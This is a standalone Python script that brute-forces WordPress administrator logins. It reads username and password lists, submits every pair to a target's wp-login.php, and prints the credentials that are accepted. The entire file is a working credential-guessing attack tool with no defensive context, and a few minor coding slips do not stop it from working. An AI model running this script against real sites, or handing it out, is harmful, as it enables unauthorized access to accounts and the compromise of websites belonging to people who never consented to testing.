import requests
import re
import sys
import getopt

def login(user,password,HOST):
    cookie = 'Does Not Matter'
    data = {
            'log':user,
            'pwd':password,
            'wp-submit':'Log In',
            'redirect_to':"http://{HOST}/wp-admin/",
            'testcookie':'1'
            }
    cookies = {
            'wordpress_test_cookie':cookie
            }
    try:  
        r = requests.post(f'http://'+HOST+'/wp-login.php', data=data, cookies=cookies)
    except requests.exceptions.InvalidURL:
        print("Please insert a valid IP.")
        sys.exit(2)
    if r.status_code != 200:
        print("some error")
    elif "is incorrect." in r.text:
        return False
    elif "Invalid username" in r.text:
        return False
    elif "The password field is empty." in r.text:
        return False
    else:
        print(f"{user}:{password}")
        return True


def main(argv): 
    PASSFILE = ''
    USERFILE = ''
    HOST = ''
    try:
        opts, args = getopt.getopt(argv,"hU:P:H:",["users=","passwords=","HOST="])
    except getopt.GetoptError:
        print(sys.argv[0] + ": Incorrect Syntax, try '-h' for help.")
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print(sys.argv[0] + ":\n[*] -U, --users <UserNameFile>\n[*] -P, --passwords <PasswordFile>\n[*] -H, --HOST <HOST>")
            sys.exit()
        elif opt in ("-U", "--users"):
            USERFILE = arg
        elif opt in ("-P", "--passwords"):
            PASSFILE = arg
        elif opt in ("-H", "--HOST"):
            HOST = arg 
    try:
        uf = open(USERFILE).readlines()
    except FileNotFoundError:
        print("Please Provide a valid username file")
        sys.exit(2)
    try: 
        pf = open(PASSFILE).readlines()
    except FileNotFoundError:
        print("Please Provide a valid password file")  
        sys.exit(2)
    for line in uf:
        username = line.strip()
        for pword in pf:
            pword = pword.strip()
            login(username,pword,HOST)
        
if __name__ == "__main__":
       main(sys.argv[1:])

